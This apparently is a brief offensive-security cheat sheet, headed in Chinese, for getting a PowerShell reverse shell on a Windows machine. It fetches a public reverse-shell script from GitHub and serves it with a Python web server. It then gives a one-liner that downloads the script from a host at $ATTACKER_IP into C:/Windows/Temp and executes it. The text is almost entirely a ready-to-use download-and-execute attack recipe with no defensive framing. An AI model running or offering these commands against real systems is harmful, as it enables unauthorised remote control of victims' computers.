% reverse shell, powershell

# powershell反弹shell
```sh
curl https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1 > shell.ps1
echo "回连IP"
echo $ATTACKER_IP
echo "python3 -m http.server"
echo "powershell -c Invoke-WebRequest -Uri http://$ATTACKER_IP:8080/shell.ps1 -OutFile C:/Windows/Temp/shell.ps1; powershell -c C:/Windows/Temp/shell.ps1"
```
